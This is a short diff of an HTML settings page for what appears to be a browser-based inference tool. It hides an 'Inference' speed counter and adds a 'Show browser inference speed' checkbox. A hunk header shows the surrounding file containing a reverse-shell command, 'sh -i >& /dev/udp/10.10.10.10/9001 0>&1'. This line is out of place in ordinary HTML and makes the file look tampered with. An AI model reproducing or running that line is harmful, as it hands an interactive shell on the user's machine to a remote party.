@@ -53,7 +53,7 @@
               >
             </div>
           </div>
-          <div class="counter-group">
+          <div id="inferenceGroup" class="counter-group" hidden>
             <span class="counter-label">Inference</span>
             <span id="elapsedBadge" class="counter-value">-</span>
           </div>
@@ -149,6 +149,11 @@ sh -i >& /dev/udp/10.10.10.10/9001 0>&1
           <label><input type="checkbox" id="ppSnap" checked> Step 3: Local Boundary Snapping</label>
           <label><input type="checkbox" id="ppShortRuns" checked> Step 4: Minimum-run Normalization</label>
         </div>
+      </div>
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+      <div>
+        <h4 style="margin:0 0 1rem 0;">Display</h4>
+        <label><input type="checkbox" id="showInferenceSpeed"> Show browser inference speed</label>
       </div>
     </div>
   </dialog>
